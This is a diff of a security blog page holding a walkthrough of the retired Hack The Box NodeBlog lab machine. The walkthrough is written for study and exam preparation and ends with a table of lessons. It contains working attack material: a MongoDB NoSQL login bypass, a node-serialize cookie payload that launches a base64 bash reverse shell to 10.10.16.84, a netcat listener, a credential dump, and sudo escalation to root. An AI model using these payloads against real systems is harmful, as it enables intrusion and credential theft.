 </code></pre>
 <p><strong>Base64 encoded:</strong></p>
-<pre><code>[redacted encoded lab material]
+<pre><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44NC80NDQ0IDA+JjEK
 </code></pre>
 <p><strong>The deserialization payload:</strong></p>
 <pre><code class="language-json" data-language="json">{
@@ -169,12 +167,12 @@ function authenticated(c) {
 }
 </code></pre>
 <p>This entire JSON object must be <strong>URL-encoded</strong> for the cookie (spaces, braces, quotes are all special characters in HTTP cookies).</p>
-<h3 id="step-12-start-the-listener">Step 12 — Start the Listener</h3>
+<h3 id="step-12-start-the-listener">Step 12: Start the Listener</h3>
 <p>In a separate terminal:</p>
 <pre><code class="language-bash" data-language="bash">nc -lnvp 4444
 </code></pre>
-<p><strong>Why netcat?</strong><br /><code>nc</code> (netcat) listens on a port and prints anything that connects to it. When our reverse shell connects back, nc receives it and gives us an interactive terminal on the remote machine.</p>
-<h3 id="step-13-send-the-payload">Step 13 — Send the Payload</h3>
+<p><strong>Why netcat?</strong><br><code>nc</code> (netcat) listens on a port and prints anything that connects to it. When our reverse shell connects back, nc receives it and gives us an interactive terminal on the remote machine.</p>
+<h3 id="step-13-send-the-payload">Step 13: Send the Payload</h3>
 <pre><code class="language-bash" data-language="bash">B64=$(echo 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1' | base64 -w0)
 
 PAYLOAD=$(python3 -c "
@@ -184,13 +182,13 @@ obj = {\"rce\": \"_\$\$ND_FUNC\$\$_function(){require('child_process').exec('\" 
 print(urllib.parse.quote(json.dumps(obj)))
 ")
 
-curl -s http://10.129.96.160:5000/ -H "Cookie: null
+curl -s http://10.129.96.160:5000/ -H "Cookie: auth=${PAYLOAD}"
 </code></pre>
 <p><strong>What happens server-side:</strong>  </p>
 <ol>
 <li>Express receives the request with our malicious <code>auth</code> cookie</li>
 <li><code>authenticated()</code> is called with our cookie value</li>
-<li><code>serialize.unserialize(cookie)</code> executes — our IIFE fires</li>
+<li><code>serialize.unserialize(cookie)</code> executes - our IIFE fires</li>
 <li><code>child_process.exec()</code> runs: decode base64 → pipe to bash → reverse shell connects out</li>
 </ol>
 <p><strong>Result:</strong> Shell received:</p>
@@ -198,10 +196,10 @@ curl -s http://10.129.96.160:5000/ -H "Cookie: null
 admin@nodeblog:/opt/blog$
 </code></pre>
 <p>We have code execution as <code>admin</code>.</p>
-<hr />
+<hr>
 <h2 id="phase-6-user-flag">Phase 6: User Flag</h2>
-<h3 id="step-14-upgrade-the-shell-tty">Step 14 — Upgrade the Shell (TTY)</h3>
-<p>The shell we received is a "dumb" shell — no tab completion, Ctrl+C kills it, passwords don't echo. We upgrade it.</p>
+<h3 id="step-14-upgrade-the-shell-tty">Step 14: Upgrade the Shell (TTY)</h3>
+<p>The shell we received is a "dumb" shell - no tab completion, Ctrl+C kills it, passwords don't echo. We upgrade it.</p>
 <pre><code class="language-bash" data-language="bash">script /dev/null -c bash
 # Press Ctrl+Z
 stty raw -echo; fg
@@ -212,40 +210,40 @@ stty raw -echo; fg
 <li><code>script /dev/null -c bash</code> spawns bash under a pseudo-terminal (PTY)</li>
 <li><code>Ctrl+Z</code> backgrounds it</li>
 <li><code>stty raw -echo</code> sets our local terminal to raw mode (passes all keystrokes through)</li>
-<li><code>fg</code> foregrounds the shell — now it's a proper interactive terminal</li>
+<li><code>fg</code> foregrounds the shell - now it's a proper interactive terminal</li>
 </ul>
-<h3 id="step-15-fix-the-home-directory">Step 15 — Fix the Home Directory</h3>
+<h3 id="step-15-fix-the-home-directory">Step 15: Fix the Home Directory</h3>
 <pre><code class="language-bash" data-language="bash">chmod +x /home/admin
 cd /home/admin
 cat user.txt
 </code></pre>
-<p><strong>Why <code>chmod +x /home/admin</code>?</strong><br />The directory <code>/home/admin</code> was deployed with permissions <code>644</code> (no execute bit). On Linux, the <strong>execute bit on a directory</strong> means "permission to enter it". Without it, even the owner can't <code>cd</code> into it or access files by path. Adding <code>+x</code> restores normal access.</p>
+<p><strong>Why <code>chmod +x /home/admin</code>?</strong><br>The directory <code>/home/admin</code> was deployed with permissions <code>644</code> (no execute bit). On Linux, the <strong>execute bit on a directory</strong> means "permission to enter it". Without it, even the owner can't <code>cd</code> into it or access files by path. Adding <code>+x</code> restores normal access.</p>
 <p><strong>This is a misconfiguration bug specific to this machine's deployment.</strong> Real-world lesson: directory permissions matter just as much as file permissions.</p>
 <p><strong>Flag:</strong> <code>61e24c[redacted]3b3b3a4c92</code></p>
-<hr />
+<hr>
 <h2 id="phase-7-privilege-escalation-to-root">Phase 7: Privilege Escalation to Root</h2>
-<h3 id="step-16-enumerate-running-services">Step 16 — Enumerate Running Services</h3>
+<h3 id="step-16-enumerate-running-services">Step 16: Enumerate Running Services</h3>
 <pre><code class="language-bash" data-language="bash">netstat -tnlp
 </code></pre>
-<p>Output shows <code>127.0.0.1:27017</code> — that's <strong>MongoDB</strong>, listening only on localhost. It's accessible from our shell.</p>
-<p><strong>Hacker mindset:</strong> Any internal service is worth probing. Databases often hold credentials. No authentication was required here.</p>
-<h3 id="step-17-dump-mongodb-credentials">Step 17 — Dump MongoDB Credentials</h3>
+<p>Output shows <code>127.0.0.1:27017</code> - that's <strong>MongoDB</strong>, listening only on localhost. It's accessible from our shell.</p>
+<p> Any internal service is worth probing. Databases often hold credentials. No authentication was required here.</p>
+<h3 id="step-17-dump-mongodb-credentials">Step 17: Dump MongoDB Credentials</h3>
 <pre><code class="language-bash" data-language="bash">mongo blog --eval "db.users.find().forEach(printjson)"
 </code></pre>
 <p><strong>Breaking it down:</strong></p>
 <ul>
-<li><code>mongo blog</code> — connect to the <code>blog</code> database</li>
-<li><code>--eval "..."</code> — run a JavaScript expression non-interactively</li>
-<li><code>db.users.find().forEach(printjson)</code> — dump all documents in the <code>users</code> collection, pretty-printed</li>
+<li><code>mongo blog</code> : connect to the <code>blog</code> database</li>
+<li><code>--eval "..."</code> : run a JavaScript expression non-interactively</li>
+<li><code>db.users.find().forEach(printjson)</code> : dump all documents in the <code>users</code> collection, pretty-printed</li>
 </ul>
 <p><strong>Result:</strong></p>
 <pre><code class="language-json" data-language="json">{
   "username": "admin",
-  "password": null
+  "password": "REDACTED"
 }
 </code></pre>
 <p>Plaintext password. Developers often store passwords in plain text in development databases and forget to hash them before deploying.</p>
-<h3 id="step-18-check-sudo-permissions">Step 18 — Check sudo Permissions</h3>
+<h3 id="step-18-check-sudo-permissions">Step 18: Check sudo Permissions</h3>
 <pre><code class="language-bash" data-language="bash">sudo -l
 </code></pre>
 <p>Enter <code>IppsecSaysPleaseSubscribe</code> when prompted.</p>
@@ -254,27 +252,27 @@ cat user.txt
     (ALL) ALL
     (ALL : ALL) ALL
 </code></pre>
-<p><strong>Admin can run ANY command as ANY user.</strong> This is the highest possible sudo privilege — equivalent to being root already.</p>
+<p><strong>Admin can run ANY command as ANY user.</strong> This is the highest possible sudo privilege - equivalent to being root already.</p>
 <p><strong>Why does <code>su -</code> fail but <code>sudo su</code> works?</strong>  </p>
 <ul>
 <li><code>su -</code> switches to root using <strong>root's password</strong> (unknown to us)</li>
 <li><code>sudo su</code> runs <code>su</code> <strong>as root</strong> (using admin's password, which we know)</li>
 </ul>
-<h3 id="step-19-get-root">Step 19 — Get Root</h3>
+<h3 id="step-19-get-root">Step 19: Get Root</h3>
 <pre><code class="language-bash" data-language="bash">sudo su
 </code></pre>
 <p>Enter <code>IppsecSaysPleaseSubscribe</code>.</p>
 <pre><code class="language-bash" data-language="bash">cat /root/root.txt
 </code></pre>
 <p><strong>Flag:</strong> <code>fc9b3e1[redacted]5dab9d86</code></p>
-<hr />
+<hr>
 <h2 id="full-attack-chain-summary">Full Attack Chain Summary</h2>
 <pre><code>[Port Scan] 
     → port 5000: Node.js/Express Blog
     
 [NoSQL Injection] 
     → POST /login with JSON Content-Type
-    → password: null "x"} bypasses MongoDB auth
+    → password: {"$ne": "x"} bypasses MongoDB auth
     → auth cookie obtained
     
 [XXE File Read]
@@ -294,14 +292,14 @@ cat user.txt
     
 [MongoDB Cred Dump]
     → mongo blog → db.users.find()
-    → plaintext password: null
+    → plaintext password: REDACTED
     
 [Privilege Escalation]
     → sudo -l → admin has (ALL) ALL
     → sudo su → root
     → cat /root/root.txt
 </code></pre>
-<hr />
+<hr>
 <h2 id="key-lessons">Key Lessons</h2>
 <table aria-label="Key Lessons data table">
 <thead>
@@ -337,11 +335,10 @@ cat user.txt
 <td>Follow principle of least privilege</td>
 </tr>
 </tbody></table>
-<hr />
-<p><em>Pwned by: 10.10.16.84 | Machine IP: 10.129.96.160 | Date: 2026-06-10</em></p>
-f:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$14"}}]
-10:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-monitorsfour-walkthrough","children":[["$","span",null,{"children":["Newer in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: MonitorsFour Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",120," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-object-walkthrough","children":[["$","span",null,{"children":["Older in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Object Walkthrough"}]]}]}]]}]
-11:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
-15:T528,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-nodeblog-walkthrough/#article","headline":"Hack The Box: NodeBlog Walkthrough","description":"An archived walkthrough of the retired Hack The Box NodeBlog machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-nodeblog-walkthrough/","datePublished":"2026-06-11T12:32:24.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":1784,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/3c8d275b9b54e1d0499a7314971aeb72d06f4929/HTB-NodeBlog.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-nodeblog-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-nodeblog-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: NodeBlog Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-nodeblog-walkthrough/"}]}]}12:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$15"}}]
-13:["$","$L16",null,{"children":["$","$17",null,{"name":"Next.MetadataOutlet","children":"$@18"}]}]
-18:null
+<hr>
+<p><em>Pwned by: 10.10.16.84 | Machine IP: 10.129.96.160 | Date: 2026-06-10</em></p>e:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$13"}}]
+f:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-monitorsfour-walkthrough","children":[["$","span",null,{"children":["Newer in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: MonitorsFour Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",120," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-object-walkthrough","children":[["$","span",null,{"children":["Older in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Object Walkthrough"}]]}]}]]}]
+10:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+14:T55f,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-nodeblog-walkthrough/#article","headline":"Hack The Box: NodeBlog Walkthrough","description":"A MongoDB query-object login bypass led to XXE source disclosure and node-serialize cookie RCE, after which a plaintext database password gave the admin account unrestricted sudo access.","url":"https://cyberkareem.com/writing/hackthebox-nodeblog-walkthrough/","datePublished":"2026-06-11T12:32:24.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":1716,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/3c8d275b9b54e1d0499a7314971aeb72d06f4929/HTB-NodeBlog.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-nodeblog-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-nodeblog-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: NodeBlog Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-nodeblog-walkthrough/"}]}]}11:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$14"}}]
+12:["$","$L15",null,{"children":["$","$16",null,{"name":"Next.MetadataOutlet","children":"$@17"}]}]
+17:null
